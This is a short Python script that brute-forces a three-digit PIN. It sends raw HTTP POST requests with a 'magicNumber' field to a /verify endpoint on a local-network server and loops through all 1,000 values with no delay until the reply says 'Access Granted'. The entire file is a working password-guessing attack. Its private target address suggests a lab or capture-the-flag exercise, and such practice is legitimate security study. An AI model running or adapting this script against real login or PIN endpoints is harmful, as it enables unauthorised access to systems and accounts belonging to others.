import socket
import time

server_ip = '192.168.1.8'
server_port = 8888
request_delay = 0

def build_http_request(pin_code):
    """Create an HTTP POST request for the given PIN."""
    pin_str_formatted = f"{pin_code:03d}"
    request_body = f"magicNumber={pin_str_formatted}"
    request_headers = (
        f"POST /verify HTTP/1.1\r\n"
        f"Host: {server_ip}:{server_port}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(request_body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    return request_headers + request_body, pin_str_formatted

def transmit_request(http_request): 
    """Send the HTTP request and return the server response."""
    server_reply = b""
    try:
        with socket.create_connection((server_ip, server_port), timeout=5) as connection:
            connection.sendall(http_request.encode())
            while True:
                try:
                    data_chunk = connection.recv(4096)
                    if not data_chunk:
                        break
                    server_reply += data_chunk
                except socket.timeout:
                    break
    except socket.error as socket_err:
        print(f"Socket error: {socket_err}")
        return None
    return server_reply

def interpret_response(server_response, attempted_pin):
    """Analyze the server response."""
    if server_response is None:
        print(f"Failed to receive response for PIN {attempted_pin}")
        return False
    
    response_text = server_response.decode(errors='ignore')
    
    if "Access Granted" in response_text:
        print(f"SUCCESS! PIN: {attempted_pin}")
        return True
    else:
        print(f"Trying PIN {attempted_pin}")
        return False

def brute_force_pin():
    current_pin = 0
    while current_pin < 1000:
        request_data, formatted_pin = build_http_request(current_pin)
        server_feedback = transmit_request(request_data)
        
        if interpret_response(server_feedback, formatted_pin):
            print(f"Found correct PIN: {formatted_pin}")
            break
        
        time.sleep(request_delay)
        current_pin += 1

if __name__ == "__main__":
    brute_force_pin()
